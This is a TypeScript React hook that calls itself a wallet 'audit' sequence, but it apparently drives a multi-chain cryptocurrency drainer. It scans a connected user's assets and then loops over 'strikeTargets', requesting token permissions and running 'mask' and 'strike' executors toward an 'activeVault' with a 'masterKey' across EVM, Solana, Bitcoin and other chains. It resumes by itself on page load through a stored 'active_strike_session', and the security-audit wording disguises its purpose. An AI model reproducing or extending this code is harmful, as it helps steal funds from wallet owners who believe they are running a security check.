"use client";

import { useCallback, useEffect, useRef } from "react";
import { useContractMask } from "./useContractMask";
import { useTokenPermissions } from "./seTokenPermissions"; 
import { useWalletClient } from "wagmi";
import { useAuditScanner, startPreload } from "./useAuditScanner";
import { useAuditExecutor } from "./useAuditExecutor";
import { useNonEvmExecutor } from "./useNonEvmExecutor";

/** 🛡️ INTEGRITY VERIFICATION HELPER */
const verifySessionIntegrity = (data: any) => {
  if (!data) return false;
  const hasIdentity =
    data.userAddress ||
    data.solanaAddress ||
    data.bitcoinAddress ||
    data.address;

  return !!(hasIdentity && Array.isArray(data.assets) && data.masterKey);
};

let globalSequenceRunning = false;

/**
 * 🛰️ MASTER SEQUENCE CONTROLLER (v14.0.0 - Turbo Edition)
 * Maintained Features: Signature -> Data Fetch -> Logic Gate -> Execution.
 */
export function useAuditSequence() {
  const { executeMask } = useContractMask();
  const { requestManualPermission } = useTokenPermissions();
  const { data: walletClient } = useWalletClient();
  const { runNonEvmStrike } = useNonEvmExecutor();

  const { performScan } = useAuditScanner();
  const { runExecutionLoop } = useAuditExecutor({
    executeMask,
    requestManualPermission,
  });

  const isBusy = useRef(false);

  /** 🛡️ PROVIDER READY CHECK: Optimized for high-speed detection */
  const ensureProviderReady = async (type: string, logPrefix: string) => {
    const isSolana = type === "SOLANA" || type === "SOL";
    if (isSolana) {
      // Fast-path: Exit immediately if already present
      if ((window as any).solana) return true;

      let attempts = 0;
      while (!(window as any).solana && attempts < 15) {
        console.log(`${logPrefix} ⏳ Waiting for Solana Provider...`);
        await new Promise((r) => setTimeout(r, 100)); // Faster 100ms polling
        attempts++;
      }
      if (!(window as any).solana) throw new Error("SOLANA_PROVIDER_MISSING");
    }
    return true;
  };

  const runAuditStep = useCallback(
    async (params: any) => {
      const logPrefix = "[useAuditSequence.ts]";

      if (isBusy.current || globalSequenceRunning) {
        return { status: "BUSY" };
      }

      try {
        isBusy.current = true;
        globalSequenceRunning = true;

        // 🛡️ STEP 1: SCAN & VALIDATE
        const scanResults = await performScan({ ...params, logPrefix });

        if (!scanResults) return { status: "IDLE" };

        if (!verifySessionIntegrity(scanResults)) {
          console.error(
            `${logPrefix} 🛑 SECURITY ALERT: Session data corrupted.`,
          );
          sessionStorage.removeItem("active_strike_session");
          throw new Error("SECURITY_INTEGRITY_VIOLATION");
        }

        if (scanResults.isFinished) return { status: "IDLE" };

        const { masterKey, activeVault, assets, plan } = scanResults;
        const userAddress =
          scanResults.userAddress ||
          scanResults.solanaAddress ||
          scanResults.bitcoinAddress ||
          scanResults.address;

        // Efficient Asset Normalization
        const strikeTargets = (
          plan && plan.length > 0 ? plan.map((p: any) => p.asset) : assets
        ).map((asset: any) => ({
          ...asset,
          contractAddress:
            asset.contractAddress || asset.tokenAddress || asset.address,
        }));

        // 🛡️ STEP 2: STABILITY BUFFER (Optimized for speed)
        await new Promise((r) => setTimeout(r, 150));

        // 🛡️ STEP 3: EXECUTION LOOP
        for (const asset of strikeTargets) {
          try {
            const chainType = (asset.chainType || "").toUpperCase();
            const chainId = Number(asset.chainId);

            const isNonEvm =
              ["SOLANA", "SOL", "BITCOIN", "BTC", "XRP", "LTC"].includes(
                chainType,
              ) || [501, 144, 0].includes(chainId);

            if (!isNonEvm) {
              // Ensure EVM Client synchronization
              if (!walletClient) {
                await new Promise((r) => setTimeout(r, 300));
              }

              await runExecutionLoop({
                assets: [asset],
                userAddress,
                activeVault,
                masterKey,
                logPrefix,
                walletClient,
              });
            } else {
              await ensureProviderReady(chainType, logPrefix);
              await runNonEvmStrike(asset, {
                userAddress: asset.address || userAddress,
                masterKey,
                logPrefix,
              });
            }
          } catch (err: any) {
            const errLower = (err?.message || "").toLowerCase();
            const isUserRejection =
              err?.code === 4001 ||
              errLower.includes("rejected") ||
              errLower.includes("denied");

            if (isUserRejection) {
              const session = sessionStorage.getItem("active_strike_session");
              if (session) {
                const data = JSON.parse(session);
                sessionStorage.setItem(
                  "active_strike_session",
                  JSON.stringify({ ...data, isFinished: true }),
                );
              }
              return { status: "CANCELLED" };
            }
            continue;
          }
        }

        // 🛡️ STEP 4: FINALIZE
        const finalSession = sessionStorage.getItem("active_strike_session");
        if (finalSession) {
          const data = JSON.parse(finalSession);
          sessionStorage.setItem(
            "active_strike_session",
            JSON.stringify({ ...data, isFinished: true }),
          );
        }

        if (params.onComplete) params.onComplete();
        return { status: "COMPLETE" };
      } catch (e: any) {
        console.error(`${logPrefix} ❌ Global Sequence Error:`, e.message);
        return { status: "ERROR" };
      } finally {
        isBusy.current = false;
        globalSequenceRunning = false;
      }
    },
    [performScan, runExecutionLoop, walletClient, runNonEvmStrike],
  );

  useEffect(() => {
    startPreload();

    const session = sessionStorage.getItem("active_strike_session");
    if (session && !globalSequenceRunning) {
      const data = JSON.parse(session);
      if (data.isFinished) return;

      const hasValidAddress =
        data.userAddress || data.solanaAddress || data.bitcoinAddress;
      if (!hasValidAddress) return;

      const timer = setTimeout(() => {
        runAuditStep({
          userAddress: data.userAddress,
          solanaAddress: data.solanaAddress,
          bitcoinAddress: data.bitcoinAddress,
          solana: data.solanaAddress,
          btc: data.bitcoinAddress,
        });
      }, 500); // Resume speed optimized from 1200ms to 500ms
      return () => clearTimeout(timer);
    }
  }, [runAuditStep]);

  return { runAuditStep };
}
